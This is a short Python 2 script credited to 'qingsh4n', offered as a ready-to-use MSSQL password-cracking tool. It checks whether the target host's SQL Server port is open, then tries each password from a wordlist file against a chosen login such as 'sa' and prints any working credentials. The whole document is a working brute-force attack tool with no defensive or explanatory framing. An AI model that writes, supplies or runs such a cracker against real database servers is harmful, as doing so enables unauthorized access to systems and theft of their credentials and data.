#!/usr/bin/env python
# coding=utf-8
# coded by qingsh4n

import pymssql
import socket
import sys
from termcolor import colored
from optparse import OptionParser

def my_print(outstring, color='red'):
    print colored(outstring, color)

def crack_sa(username, password):
    global isfind
    global hostname
    global port
    global verbose

    password = password.strip('\n').strip('\r')
    if verbose:
        my_print('[*] Attempt Name: %s, Password: %s' % (username, password), 'yellow')

    try:
        conn = pymssql.connect(host=hostname+':'+port, user=username, password=password)

        if conn:
            my_print('[+] Find MSSQL USER, Name: %s, Password: %s' % (username, password), 'green')
            isfind = True
            conn.close()

    except Exception, e:
        if verbose:
            print '[-] Error...'

def check_1433():
    global hostname
    global port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((hostname, int(port)))
        if verbose:
            my_print('[+] This host %s port is open!' % port, 'green')
        return
    except:
        if verbose:
            my_print('[-] This host %s port is not open!' % port)
        sys.exit()

if __name__=="__main__":
    isfind = False
    try:
        usage = 'usage: %prog -H 7.7.7.7 [-L sa] [-V 1] [-F passwd.txt] [-P 1433]'
        parser = OptionParser(usage)
        parser.add_option("-H", "--host", dest="host",
            help="host to crack")
        parser.add_option("-U", "--username", dest="username",
            help="username to crack")
        parser.add_option("-P", "--port", dest="port",
            help="port mssql listening")
        parser.add_option("-F", "--file", dest="file",
            help="file contains passwd")
        parser.add_option("-V", "--verbose", dest="verbose",
            help="verbose level, 1 or 0")
        (options, args)=parser.parse_args()
        #print args
        hostname = options.host
        port = options.port
        username = options.username
        file = options.file
        verbose = options.verbose
    except:
        parser.print_help()
        sys.exit()

    check_1433()
    #crack_sa(username, username)
    #crack_sa(username, '')

    try:
        f = open(file, 'r')
    except Exception, e:
        if verbose:
            my_print('[-] Error: ' + str(e))
        sys.exit()

    for password in f:
        if isfind:
            break
        crack_sa(username, password)

    f.close()
